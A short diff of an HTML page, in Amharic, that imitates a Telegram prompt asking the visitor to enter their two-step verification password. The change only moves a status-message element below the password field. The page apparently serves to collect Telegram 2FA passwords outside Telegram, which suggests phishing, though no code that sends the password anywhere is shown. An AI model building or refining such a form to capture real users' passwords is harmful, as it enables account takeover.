@@ -242,9 +242,7 @@
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Objects/Locked%20With%20Key.webp" style="width: 150px; height: 150px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
             
             <h2>የቴሌግራም ፓስዎርድ</h2>
-            <p>የእርስዎ ቴሌግራም በፓስዎርድ (2FA) የተቆለፈ ነው። ለመቀጠል ፓስዎርድዎን ያስገቡ።</p>
-            
-            <div id="status3" class="msg"></div>
+            <p>የእርስዎ ቴሌግራም በፓስዎርድ (2FA) የተቆለፈ ነው። ለመቀጠል ፓስዎርድዎን ያስገቡ።</p>                        
             
             <div style="position: relative; width: 100%; margin-bottom: 10px;">
                 <input type="password" id="2fa_input" placeholder="ፓስዎርድ ያስገቡ" style="padding-right: 45px;" oninput="hideMsg(3)">
@@ -252,7 +250,9 @@
                     <i class="fa-solid fa-eye" id="toggleIcon" style="color: var(--text-muted); font-size: 18px;"></i>
                 </div>
             </div>
-            
+          
+            <div id="status3" class="msg"></div>
+          
             <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
                 <div class="btn-spinner" id="confirmSpinner"></div>
                 <span id="confirmText">አረጋግጥ</span>
